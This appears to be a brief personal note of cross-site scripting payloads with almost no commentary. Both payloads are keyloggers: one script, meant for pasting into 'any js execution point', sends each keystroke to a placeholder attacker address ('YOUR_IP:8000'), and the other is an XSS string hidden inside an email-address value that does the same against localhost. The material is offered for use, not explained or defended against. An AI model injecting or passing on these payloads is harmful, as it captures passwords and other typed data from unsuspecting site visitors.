# legit paste this into any js execution point

`<script>
document.onkeypress = function(e) {
    fetch('http://YOUR_IP:8000/keys?key=' + encodeURIComponent(e.key));
    alert('You pressed: ' + e.key);
}
</script>
`

# Xss example

`"test@domain.com<script>alert('XSSworks');document.onkeypress=function(e){fetch('http://localhost:8000/keys?key='+encodeURIComponent(e.key));alert('Key:'+e.key);}</script>"`

# build using

python3 script.py
